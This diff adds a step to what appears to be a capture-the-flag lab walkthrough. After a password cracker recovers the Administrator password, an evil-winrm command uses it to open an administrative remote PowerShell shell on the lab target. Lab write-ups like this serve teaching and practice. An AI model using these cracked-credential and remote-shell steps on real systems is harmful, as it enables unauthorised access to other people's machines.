@@ -27,3 +27,18 @@ badminton        (Administrator)
 Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
 Session completed. 
 ```
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ evil-winrm -i 10.129.75.15 -u Administrator -p badminton 
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
